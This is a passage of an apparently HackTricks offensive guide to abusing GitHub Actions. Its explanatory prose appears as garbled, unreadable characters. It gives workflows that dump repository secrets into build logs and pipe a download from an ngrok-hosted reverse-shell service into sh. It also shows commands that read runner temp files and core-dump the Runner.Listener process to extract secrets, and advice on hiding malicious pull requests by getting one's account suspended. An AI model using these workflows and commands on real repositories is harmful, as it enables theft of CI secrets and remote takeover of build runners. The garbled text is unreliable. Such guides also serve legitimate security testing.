{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### рд╕реАрдХреНрд░реЗрдЯреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ <a href="#accessing-secrets" id="accessing-secrets"></a>

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдЬрд╛рдирдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХрд┐ рдЖрдк рд╕реАрдХреНрд░реЗрдЯреНрд╕ рддрдХ рдХреИрд╕реЗ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

* рдпрджрд┐ рд╕реАрдХреНрд░реЗрдЯ рдпрд╛ рдЯреЛрдХрди рдХреЛ **рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ рд╕реАрдзреЗ рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **`printenv`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

<details>

<summary>рдЧрд┐рдЯрд╣рдм рдПрдХреНрд╢рди рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдВ</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Secrets рдХреЗ рд╕рд╛рде рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* рдпрджрд┐ рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдкреНрд░рддреНрдпрдХреНрд╖ рд░реВрдк рд╕реЗ рдПрдХ рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдореЗрдВ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрддреНрдкрдиреНрди рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ **рдбрд┐рд╕реНрдХ рдкрд░** рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИ рдФрд░ рд╕реБрд▓рдн рд╣реЛрддреА рд╣реИред
* ```bash
cat /home/runner/work/_temp/*
```
* рдПрдХ JavaScript actions рдХреЗ рд▓рд┐рдП рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдкрд░реНрдпрд╛рд╡рд░рдг рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ
* ```bash
ps axe | grep node
```
*   рдПрдХ **рдХрд╕реНрдЯрдо рдПрдХреНрд╢рди** рдХреЗ рд▓рд┐рдП, рдЬреЛрдЦрд┐рдо рдЗрд╕ рдмрд╛рдд рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдиреЗ **рдЖрд░реНрдЧреБрдореЗрдВрдЯ** рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рд╣реИ:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Self-hosted runners рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдХрд┐ рдХреМрди рд╕реЗ **Github Actions рдЧреИрд░-рдЧрд┐рдЯрд╣рдм рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рд░рд╣реЗ рд╣реИрдВ** рдпрд╣ рд╣реИ рдХрд┐ Github Action рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди yaml рдореЗрдВ **`runs-on: self-hosted`** рдЦреЛрдЬреЗрдВред

**Self-hosted** runners рдХреЛ **рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА**, рдЕрдиреНрдп **рдиреЗрдЯрд╡рд░реНрдХ рд╕рд┐рд╕реНрдЯрдореНрд╕** (рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдХрдордЬреЛрд░ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕? рдореЗрдЯрд╛рдбреЗрдЯрд╛ рд╕реЗрд╡рд╛?) рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдпрд╛, рднрд▓реЗ рд╣реА рдпрд╣ рдЕрд▓рдЧ-рдерд▓рдЧ рдФрд░ рдирд╖реНрдЯ рд╣реЛ, **рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдПрдХреНрд╢рди рдПрдХ рд╣реА рд╕рдордп рдореЗрдВ рдЪрд▓рд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдПрдХреНрд╢рди **рдЕрдиреНрдп рдПрдХреНрд╢рди рдХреЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ**ред

Self-hosted runners рдореЗрдВ рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **\_Runner.Listener**\_\*\* рдкреНрд░рдХреНрд░рд┐рдпрд╛\*\* рд╕реЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛рдПрдВ рдЬреЛ рдХрд┐рд╕реА рднреА рдЪрд░рдг рдореЗрдВ рд╡рд░реНрдХрдлрд╝реНрд▓реЛрдЬрд╝ рдХреЗ рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдЙрд╕рдХреА рдореЗрдореЛрд░реА рдХреЛ рдбрдВрдк рдХрд░рдХреЗ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдЧрд╛:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

[**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦреЗрдВ**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ Github actions рдмрдирд╛рдП рдЬрд╛рдПрдВ рдЬреЛ **Docker image рдХреЛ Github рдХреЗ рдЕрдВрджрд░ build рдФрд░ store рдХрд░реЗрдВ**ред\
рдПрдХ рдЙрджрд╛рд╣рд░рдг рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡рд┐рд╕реНрддрд╛рд░ рдпреЛрдЧреНрдп рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, Github рд░рдЬрд┐рд╕реНрдЯреНрд░реА **`ghcr.io`** рдореЗрдВ рд╣реЛрд╕реНрдЯ рдХреА рдЧрдИ рд╣реИред

рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рд░рд┐рдкреЛ рдкрд░ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Docker Image рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХреЗрдЧрд╛:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
рдлрд┐рд░, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **Docker image layers рдореЗрдВ leaked secrets** рдЦреЛрдЬ рд╕рдХрддрд╛ рд╣реИ:

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions logs рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА

рднрд▓реЗ рд╣реА **Github** actions logs рдореЗрдВ **secret values рдХреЛ detect** рдХрд░рдиреЗ рдФрд░ **рдЙрдиреНрд╣реЗрдВ рджрд┐рдЦрд╛рдиреЗ рд╕реЗ рдмрдЪрдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ, **рдЕрдиреНрдп рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛** рдЬреЛ action рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдореЗрдВ рдЙрддреНрдкрдиреНрди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЫрд┐рдкрд╛ рдирд╣реАрдВ рд░рд╣реЗрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ secret value рдХреЗ рд╕рд╛рде рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ JWT рддрдм рддрдХ рдЫрд┐рдкрд╛ рдирд╣реАрдВ рд░рд╣реЗрдЧрд╛ рдЬрдм рддрдХ рдХрд┐ рдЗрд╕реЗ [рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред

## рдЕрдкрдиреЗ Tracks рдХреЛ рдХрд╡рд░ рдХрд░рдирд╛

([**рдпрд╣рд╛рдВ**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit) рд╕реЗ рддрдХрдиреАрдХ) рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдХреЛрдИ рднреА PR рдЬреЛ рдЙрдард╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╡рд╣ Github рдФрд░ рд▓рдХреНрд╖рд┐рдд GitHub рдЦрд╛рддреЗ рдореЗрдВ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИред GitHub рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рд╣рдо **рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ PR рдХреЛ рд╣рдЯрд╛ рдирд╣реАрдВ рд╕рдХрддреЗ**, рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рдПрдХ рдЯреНрд╡рд┐рд╕реНрдЯ рд╣реИред Github рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП рдЬреЛ **Github рджреНрд╡рд╛рд░рд╛ рдирд┐рд▓рдВрдмрд┐рдд** рдХрд┐рдП рдЧрдП рд╣реИрдВ, рдЙрдирдХреЗ рд╕рднреА **PR рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ** рдФрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рдЕрдкрдиреА рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рдЫрд┐рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдпрд╛ рддреЛ рдЕрдкрдирд╛ **GitHub рдЦрд╛рддрд╛ рдирд┐рд▓рдВрдмрд┐рдд рдХрд░рд╡рд╛рдирд╛ рд╣реЛрдЧрд╛ рдпрд╛ рдЕрдкрдирд╛ рдЦрд╛рддрд╛ рдлреНрд▓реИрдЧ рдХрд░рд╡рд╛рдирд╛ рд╣реЛрдЧрд╛**ред рдЗрд╕рд╕реЗ **рдЖрдкрдХреА рд╕рднреА рдЧрддрд┐рд╡рд┐рдзрд┐рдпрд╛рдБ** GitHub рдкрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдЫрд┐рдк рдЬрд╛рдПрдВрдЧреА (рдореВрд▓ рд░реВрдк рд╕реЗ рдЖрдкрдХреЗ рд╕рднреА exploit PR рдХреЛ рд╣рдЯрд╛ рджреЗрдВрдЧреА)ред

GitHub рдореЗрдВ рдПрдХ рд╕рдВрдЧрдарди рдмрд╣реБрдд рд╕рдХреНрд░рд┐рдп рд░реВрдк рд╕реЗ GitHub рдХреЛ рдЦрд╛рддреЛрдВ рдХреА рд░рд┐рдкреЛрд░реНрдЯ рдХрд░рддрд╛ рд╣реИред рдЖрдкрдХреЛ рдмрд╕ "рдХреБрдЫ рд╕рд╛рдорд╛рди" Issue рдореЗрдВ рд╕рд╛рдЭрд╛ рдХрд░рдирд╛ рд╣реИ рдФрд░ рд╡реЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВрдЧреЗ рдХрд┐ рдЖрдкрдХрд╛ рдЦрд╛рддрд╛ 12 рдШрдВрдЯреЛрдВ рдореЗрдВ рдирд┐рд▓рдВрдмрд┐рдд рд╣реЛ рдЬрд╛рдП :p рдФрд░ рд╡рд╣рд╛рдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╣реИ, рдЖрдкрдХрд╛ exploit github рдкрд░ рдЕрджреГрд╢реНрдп рд╣реЛ рдЧрдпрд╛ред

{% hint style="warning" %}
рдХрд┐рд╕реА рд╕рдВрдЧрдарди рдХреЗ рд▓рд┐рдП рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рд▓рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, SIEM рд╕реЗ GitHub logs рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ GitHub UI рд╕реЗ PR рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
{% endhint %}

## Tools

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдкрдХрд░рдг Github Action workflows рдХреЛ рдЦреЛрдЬрдиреЗ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдХрдордЬреЛрд░ рд▓реЛрдЧреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИрдВ:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
AWS Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХреЛ рд╕рдорд░реНрдерди рджреЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
{% endhint %}
